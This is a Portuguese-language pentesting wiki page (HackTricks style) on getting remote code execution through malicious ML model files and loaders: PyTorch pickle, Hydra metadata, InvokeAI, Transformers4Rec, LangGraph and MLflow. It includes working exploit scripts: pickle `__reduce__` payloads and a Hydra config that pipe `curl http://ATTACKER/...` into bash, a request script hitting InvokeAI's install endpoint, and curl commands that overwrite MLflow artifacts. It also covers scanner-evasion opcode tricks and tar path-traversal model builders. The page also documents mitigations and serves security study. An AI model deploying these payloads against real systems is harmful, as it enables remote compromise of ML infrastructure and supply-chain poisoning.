# RCE de modelos

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Os modelos de Machine Learning geralmente são compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção para serem usados. Em geral, os modelos não deveriam conter código malicioso, mas há casos em que o modelo pode ser usado para executar código arbitrário no sistema como um recurso intencional ou devido a uma vulnerabilidade na biblioteca de carregamento de modelos.

A tabela a seguir lista vulnerabilidades representativas dessa categoria:

| **Framework / Ferramenta**        | **Vulnerabilidade (CVE, se disponível)**                                                    | **Vetor de RCE**                                                                                                                           | **Referências**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)**                                                              | Um pickle malicioso no checkpoint do modelo leva à execução de código (contornando a proteção `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download de modelo malicioso causa execução de código; RCE por desserialização Java na API de gerenciamento                                        | |
| **NVIDIA Merlin Transformers4Rec** | Desserialização insegura de checkpoint via `torch.load` **(CVE-2025-23298)**                                           | Um checkpoint não confiável aciona o reducer do pickle durante `load_model_trainer_states_from_checkpoint` → execução de código no worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook inseguro de extensão do MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | A chave `filter` controlada pelo usuário injeta sintaxe SQL/JSON-path; `UNION SELECT` fabrica uma linha falsa de checkpoint; em seguida, a desserialização do `msgpack` importa e chama código Python escolhido pelo atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Carregar um modelo de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar um modelo com a camada **Lambda** executa código Python arbitrário          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análise de TFLite)                                                                                          | Um modelo `.tflite` criado especialmente aciona um integer overflow → corrupção do heap (possível RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Carregar um modelo por meio de `joblib.load` executa um pickle com o payload `__reduce__` do atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *contestada*                                                                              | O padrão de `numpy.load` permitia arrays de objetos pickle; um `.npy/.npz` malicioso aciona execução de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (path traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | O caminho dos pesos externos do modelo ONNX pode escapar do diretório (leitura de arquivos arbitrários) <br> Um tar de modelo ONNX malicioso pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (risco de design)  | *(Sem CVE)* Custom ops / fluxo de controle do ONNX                                                                                    | Um modelo com um operador personalizado exige o carregamento de código nativo do atacante; grafos de modelos complexos abusam da lógica para executar cálculos não intencionais   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar a API de carregamento de modelos com `--model-control` habilitado permite path traversal relativo para gravar arquivos (por exemplo, sobrescrever `.bashrc` para RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (vários heap overflows)                                                                         | Um arquivo de modelo GGUF malformado causa heap buffer overflows no parser, permitindo a execução de código arbitrário no sistema da vítima                     | |
| **Keras (formatos antigos)**   | *(Sem novo CVE)* Modelo Keras H5 legado                                                                                         | O código da camada Lambda em um modelo HDF5 (`.h5`) malicioso ainda é executado ao carregar (o safe_mode do Keras não cobre o formato antigo — “ataque de downgrade”) | |
| **Outros** (geral)        | *Falha de design* – serialização com Pickle                                                                                         | Muitas ferramentas de ML (por exemplo, formatos de modelo baseados em pickle, `pickle.load` do Python) executam código arbitrário incorporado em arquivos de modelo, a menos que haja mitigação | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadados não confiáveis passados para `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadados/configuração do modelo controlados pelo atacante definem `_target_` como um callable arbitrário (por exemplo, `builtins.exec`) → executado durante o carregamento, mesmo com formatos “seguros” (`.safetensors`, `.nemo`, `config.json` do repositório) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Além disso, há modelos Python baseados em pickle, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### Evadindo verificações estáticas em checkpoints baseados em pickle

Um caminho de carregamento de modelos que chama `pickle.load()`, `joblib.load()` ou `torch.load(..., weights_only=False)` sem restrições é um ponto de execução, não apenas um parser.<sup>[[22]](#references)</sup> No PyTorch 2.6, `torch.load()` usa `weights_only=True` por padrão quando nenhum módulo pickle personalizado é fornecido; os exemplos abaixo exigem um carregador sem restrições ou uma aplicação que desabilite essa proteção para carregar um objeto não compatível.<sup>[[4]](#references)</sup> Um resultado limpo na análise estática não altera esse limite.<sup>[[21]](#references)</sup>

Veja [Desserialização de Python pickle](../pentesting-web/deserialization/#pickle) para conhecer a primitiva básica `__reduce__` e a [allowlist de importações de ML do Fickling](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) para verificações de importação em tempo de execução.

#### Registre um callable e, em seguida, resolva-o com `EXT2`

Um pickle pode invocar `copyreg.add_extension` por meio de `REDUCE`, registrando um par módulo/nome sob um código de extensão numérico escolhido pelo atacante. Um `EXT2` posterior resolve esse código para o callable, que outro `REDUCE` pode invocar. Portanto, o callable crítico não é o operando de um opcode `GLOBAL` ou `STACK_GLOBAL`. A Binarly demonstrou isso com `multiprocessing.util.spawnv_passfds`; quatro dos cinco scanners avaliados não detectaram o caso, enquanto o SaferPickle o detectou. A alteração do registro e a resolução por `EXT2` acontecem na mesma operação de unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Este é um esboço de opcode, não um checkpoint completo: o carregador externo precisa aceitar o fluxo pickle ao redor. Um scanner que apenas procura callables perigosos nos operandos `GLOBAL` não detecta a consulta posterior; um scanner sem suporte a `EXT2` pode falhar antes de emitir um veredito. Uma allowlist estrita ainda poderia rejeitar o próprio `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Ocultar tipos de objetos de código construídos atrás de funções comuns

Outra cadeia pickle pode obter `FunctionType` de `type(copy.copy)` e `CodeType` de `type(copy.copy.__code__)`, depois construir um objeto de código a partir de bytecode fornecido, envolvê-lo como uma função e chamá-lo. A variante publicada obtém `__code__` por meio de `operator.methodcaller('__getattribute__', '__code__')`, portanto o pickle não precisa importar nenhum dos construtores pelo nome. O layout dos campos de `CodeType(...)` e o bytecode são específicos da versão do CPython; um payload criado para outro interpretador pode falhar antes da execução. O SaferPickle ainda sinalizou o exemplo demonstrado, mas o rebaixou para `suspicious`; os outros quatro scanners avaliados não o detectaram.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Acionar o carregamento de um segundo modelo a partir de um argumento pickle

Um pickle externo pode chamar `torch.storage._load_from_bytes` com um modelo serializado fornecido pelo atacante como argumento. Essa função chama `torch.load(io.BytesIO(b), weights_only=False)`, então o modelo aninhado é desserializado sem a restrição de weights-only, embora pareça, para um scanner de opcodes de nível superior, ser apenas bytes passados a um único callable. O carregamento externo ainda precisa permitir esse callable; `weights_only=True` não faz o pickle externo aceitá-lo automaticamente. Scanners que não percorrem recursivamente os bytes aninhados podem não detectar a cadeia interna `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Resolver um nome de módulo pickle legado no momento do carregamento

Para protocolos pickle anteriores a 3, o padrão do Python, `fix_imports=True`, mapeia uma referência `GLOBAL` a `commands.run` para `subprocess.run` por meio de `_compat_pickle.IMPORT_MAPPING`. Portanto, um scanner que compara a string literal do módulo com uma denylist de `subprocess` pode não detectar o callable usado em tempo de execução. Isso requer um loader que preserve o mapeamento de compatibilidade e aceite os argumentos resultantes da chamada.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Fazer um checkpoint que não seja ZIP passar por um scanner exclusivo para ZIP

A seleção do formato pode falhar independentemente da inspeção de opcodes: a Binarly descobriu que o ModelScan 0.8.8 encaminhava arquivos `.bin`, `.pt`, `.pth` e `.ckpt` para um scanner PyTorch específico para ZIP e ignorava um fluxo pickle que não fosse ZIP, em vez de recorrer ao scanner de pickle simples. Também documentou um layout de modelo TAR legado aceito por `torch.load()`, mas não inspecionado pelo ModelScan nem pelo JFrog. Essas são lacunas específicas das versões dos scanners, não características de todos os scanners de modelos.<sup>[[21]](#references)</sup>

#### Executar antes que um parser estático alcance um trecho final malformado

Um scanner que percorre um pickle por completo com `pickletools.genops()` pode gerar uma exceção ao encontrar um opcode truncado após um `REDUCE` válido. O unpickler irrestrito já invocou o callable antes de encontrar esse trecho, mesmo que o carregamento completo gere uma exceção depois. O exemplo relatado colocava um `BINUNICODE` truncado imediatamente após o `REDUCE` que executava o código, fazendo `pickletools.genops()` falhar depois que o efeito colateral de gravação do arquivo já havia ocorrido. Isso só contorna um scanner se ele tratar o erro de análise como se estivesse tudo certo ou ignorar o arquivo. Só é útil quando o efeito colateral importa mesmo sem um modelo retornado com sucesso; um alvo que exija o carregamento concluído pode rejeitar o artefato.<sup>[[21]](#references)</sup>

### Metadados Hydra → RCE (funciona até com safetensors)

`hydra.utils.instantiate()` importa e chama qualquer `_target_` com notação de pontos em um objeto de configuração/metadados. Quando bibliotecas como Hugging Face Transformers passam **metadados de modelo não confiáveis** para `instantiate()`, um atacante pode fornecer um callable e argumentos que são executados imediatamente durante o carregamento do modelo (sem necessidade de pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Exemplo de payload (funciona em `model_config.yaml` de `.nemo`, `config.json` de um repositório ou `__metadata__` dentro de `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Pontos principais:
- Acionado antes da inicialização do modelo em `restore_from/from_pretrained` do NeMo, nos coders HuggingFace do uni2TS e nos loaders do FlexTok.
- A block-list de strings do Hydra pode ser contornada por caminhos de importação alternativos (por exemplo, `enum.bltns.eval`) ou nomes resolvidos pela aplicação (por exemplo, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- O FlexTok também analisa metadados serializados como strings com `ast.literal_eval`, possibilitando DoS (sobrecarga de CPU/memória) antes da chamada ao Hydra.

### 🆕  RCE no InvokeAI via `torch.load` (CVE-2024-12029)

O `InvokeAI` é uma interface web popular e de código aberto para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install`, que permite aos usuários baixar e carregar modelos de URLs arbitrárias.<sup>[[1]](#references)</sup>

Internamente, o endpoint acaba chamando:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Quando o arquivo fornecido é um **checkpoint do PyTorch (`*.ckpt`)**, `torch.load` realiza uma **desserialização pickle**. Como o conteúdo vem diretamente da URL controlada pelo usuário, um atacante pode inserir um objeto malicioso com um método `__reduce__` personalizado no checkpoint; o método é executado **durante a desserialização**, levando à **execução remota de código (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu o identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo da exploração

1. Crie um checkpoint malicioso:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hospede `payload.ckpt` em um servidor HTTP sob seu controle (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (não é necessária autenticação):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante obtém execução de código no contexto do processo do InvokeAI.

Exploit pronto: o módulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.<sup>[[3]](#references)</sup>

#### Condições

•  InvokeAI 5.3.1-5.4.2 (flag de scan com valor padrão **false**)
•  `/api/v2/models/install` acessível pelo atacante
•  O processo tem permissões para executar comandos shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza a varredura de malware antes da desserialização.<sup>[[2]](#references)</sup>
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplique allow-lists / assinaturas para as fontes dos modelos e execute o serviço com o menor privilégio possível.

> ⚠️ Lembre-se de que **qualquer** formato baseado em Python pickle (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserialização de fontes não confiáveis.

---

Exemplo de mitigação ad hoc caso seja necessário manter versões mais antigas do InvokeAI em execução atrás de um proxy reverso:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE no NVIDIA Merlin Transformers4Rec via `torch.load` inseguro (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expunha um carregador de checkpoint inseguro que chamava diretamente `torch.load()` em caminhos fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado pelo atacante pode executar código arbitrário por meio de um reducer durante a desserialização.<sup>[[5]](#references)</sup>

Caminho vulnerável (antes da correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no Python `pickle`, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna uma função chamável e argumentos. A função chamável é executada durante a desserialização. Se esse objeto estiver presente em um checkpoint, ele é executado antes de qualquer peso ser usado.

Exemplo mínimo de checkpoint malicioso:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vetores de entrega e raio de impacto:
- Checkpoints/modelos trojanizados compartilhados por meio de repos, buckets ou registros de artefatos
- Pipelines automatizados de retomada/implantação que carregam checkpoints automaticamente
- A execução ocorre dentro de workers de treinamento/inferência, muitas vezes com privilégios elevados (por exemplo, root em contêineres)

Correção: O commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu a chamada direta a `torch.load()` por um desserializador restrito, com lista de permissões, implementado em `transformers4rec/utils/serialization.py`. O novo loader valida tipos/campos e impede a invocação de callables arbitrários durante o carregamento.<sup>[[7]](#references)</sup>

Orientações de defesa específicas para checkpoints do PyTorch:
- Não desserialize dados não confiáveis com pickle. Prefira formatos não executáveis, como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX, quando possível.
- Se precisar usar a serialização do PyTorch, garanta que `weights_only=True` (compatível com versões mais recentes do PyTorch) ou use um unpickler personalizado com lista de permissões, semelhante ao patch do Transformers4Rec.<sup>[[4]](#references)</sup>
- Garanta a procedência/assinaturas do modelo e use sandbox para desserialização (seccomp/AppArmor; usuário sem privilégios de root; sistema de arquivos restrito e sem tráfego de saída pela rede).
- Monitore processos filhos inesperados iniciados por serviços de ML durante o carregamento de checkpoints; rastreie o uso de `torch.load()`/`pickle`.

Referências de POC e de versões vulnerável/corrigida:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerável anterior ao patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader posterior ao patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Exemplo – criação de um modelo PyTorch malicioso

- Crie o modelo:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Carregue o modelo:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Desserialização do Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que desserializa dados controlados pelo usuário. A ZDI confirmou que um atacante remoto pode induzir uma vítima a carregar uma página/arquivo malicioso, fazer com que ele envie um blob serializado especialmente criado para esse endpoint e acionar a desserialização como `root`, levando ao comprometimento total.

O fluxo de exploração é semelhante ao abuso típico de pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Qualquer gadget acessível durante a desserialização (construtores, `__setstate__`, callbacks do framework etc.) pode ser weaponized da mesma forma, independentemente de o transporte ser HTTP, WebSocket ou um arquivo colocado em um diretório monitorado.



### LangGraph checkpointer SQLi → MessagePack RCE

Esta cadeia de ataque é interessante porque o atacante **não precisa fazer upload de um arquivo de modelo malicioso**. Em vez disso, a aplicação expõe uma **API de persistência de agente de IA** (`get_state_history(..., filter=...)`), e a entrada do usuário chega ao construtor de consultas do checkpointer.

#### 1. SQLi estrutural em filtros de metadados

Um padrão vulnerável de SQLite era:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

O valor é vinculado posteriormente, mas `query_key` é concatenado à **string do caminho JSON**, então um `'` dentro da chave do dicionário sai de `'$.{query_key}'` e injeta SQL. A mesma lição se aplica a **caminhos JSON, identificadores, operadores, campos `LIMIT` e TTL**: placeholders protegem apenas valores, não a sintaxe estrutural da consulta.

#### 2. `UNION SELECT` pode atingir sinks downstream, não apenas roubar dados

A consulta retorna `type` e bytes de `checkpoint` serializados, que são consumidos posteriormente como:

```python
self.serde.loads_typed((type, checkpoint))
```

Isso significa que uma SQLi na cláusula `WHERE` pode injetar uma **linha de resultado falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Se o código posterior analisar, desserializar, gravar ou executar alguma coluna selecionada, mapeie essas colunas para seus sinks. Neste caso, a linha falsa transforma SQLi em **desserialização controlada pelo atacante**.

#### 3. Hooks de extensão inseguros do MessagePack equivalem a gadgets de código

O caminho `msgpack` do LangGraph usava um hook de extensão personalizado que desempacotava uma tupla aninhada e executava:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Assim, um objeto de extensão MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resolve `system` e executa o comando. Ao revisar frameworks de IA, inspecione **revivers personalizados de MessagePack/JSON/pickle** em busca de imports dinâmicos, reflection ou dispatch arbitrário de callables.

#### 4. Padrão prático de auditoria para frameworks de agentes

Revise qualquer entrada controlada pelo usuário que chegue a:
- APIs de histórico de estado / memória / replay / listagem de checkpoints
- builders de filtros estruturados que geram fragmentos de consultas SQL ou Redis
- desserializadores personalizados (`pickle`, `msgpack`, hooks de objetos `json`, construtores YAML)
- caminhos de recuperação que confiam em linhas retornadas pela camada de persistência

Essa cadeia específica afetou implantações self-hosted do LangGraph que usam checkpointers **SQLite** ou **Redis**, quando usuários não confiáveis podiam controlar `filter`. As versões corrigidas indicadas na divulgação foram `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` e `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Sobrescrita de artefato MLflow PyFunc para RCE via pickle

Um MLflow PyFunc criado a partir de um `PythonModel` pode armazenar o objeto serializado como `python_model.pkl`. Os metadados do modelo indicam `mlflow.pyfunc.model` como seu loader, e a implementação do MLflow usa esse nome de arquivo para o modelo Python salvo. Consequentemente, o acesso de escrita ao armazenamento de artefatos pode levar à execução de código em outro aplicativo que carregue o modelo posteriormente.<sup>[[17]](#references)[[18]](#references)</sup>

A cadeia útil é **permissão de escrita no artefato → substituir o pickle → fazer um consumidor de inferência recarregá-lo**. Para um experimento que usa uma raiz `mlflow-artifacts:/...` com proxy, enumere o caminho do artefato do experimento, da execução e do modelo. O servidor de tracking expõe `GET` e `PUT` em `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Um reducer mínimo pode executar um comando assim que o consumidor desserializar o artefato. Gerar o payload com a versão do Python declarada em `MLmodel` evita problemas de compatibilidade.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Acione a operação que **carrega o modelo existente**, como previsão, scoring ou implantação. Não treine novamente antes, pois o treinamento pode substituir o artefato malicioso por um modelo novo. Um erro da aplicação não descarta a exploração: o reducer retorna o status de saída inteiro do comando, em vez de um modelo utilizável. Comece com um efeito colateral observável, como ICMP ou um callback HTTP, e depois substitua-o pelo payload final.<sup>[[20]](#references)</sup>

Durante a avaliação, diferencie a permissão para criar um run da permissão para sobrescrever artefatos pertencentes a outro run. Revise a autenticação e as permissões de atualização por run, inspecione modificações inesperadas em `python_model.pkl` e trate a proveniência e a integridade do modelo como parte do limite de execução. O código atual do MLflow também oferece suporte à configuração de `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` e recomenda artefatos models-from-code em vez de carregar dados cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Servidores de modelos expostos e infraestrutura de ML

Carregar um modelo malicioso não é a única forma de executar código na infraestrutura de ML. APIs de envio de tarefas, endpoints de validação de código e pulls do registro de modelos de serviços de IA auto-hospedados podem levar à execução de código sem nenhum arquivo de modelo. Consulte [Serviços de IA auto-hospedados expostos](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelos para Path Traversal

Como comentado [**nesta postagem do blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelo usados por diferentes frameworks de IA é baseada em arquivos compactados, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar ataques de Path Traversal, permitindo a leitura de arquivos arbitrários do sistema em que o modelo é carregado.<sup>[[16]](#references)</sup>

Por exemplo, com o código a seguir, você pode criar um modelo que criará um arquivo no diretório `/tmp` quando for carregado:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ou, com o código a seguir, você pode criar um modelo que criará um symlink para o diretório `/tmp` quando carregado:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Análise aprofundada: desserialização de Keras .keras e busca por gadgets

Para um guia focado nos detalhes internos de .keras, RCE em camadas Lambda, o problema de importação arbitrária na versão ≤ 3.8 e a descoberta de gadgets após a correção dentro da allowlist, veja:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog da OffSec – "CVE-2024-12029 – Desserialização de dados não confiáveis no InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de correção do InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentação do módulo Metasploit da Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considerações de segurança para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog da ZDI – CVE-2025-23298: obtendo execução remota de código no NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Comunicado da ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de correção do Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Carregador vulnerável pré-correção (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Carregador pós-correção (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – execução remota de código com formatos e bibliotecas modernos de AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentação do instantiate do Hydra](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de block-list do Hydra (aviso sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – de SQLi a RCE: explorando o Checkpointer do LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Transformando bugs de Archive Slip em recompensas de alto valor em AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Comunicado da Snyk e prova de conceito PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Código-fonte do MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST do MLflow – endpoints de download e upload de artefatos](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taxonomia de evasão de scanner estático do Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – detecção de modelos maliciosos com MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Implementação de storage `_load_from_bytes` do PyTorch](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Mapeamento de compatibilidade de `find_class` do pickle do CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Mapeamento de importação `_compat_pickle` do CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
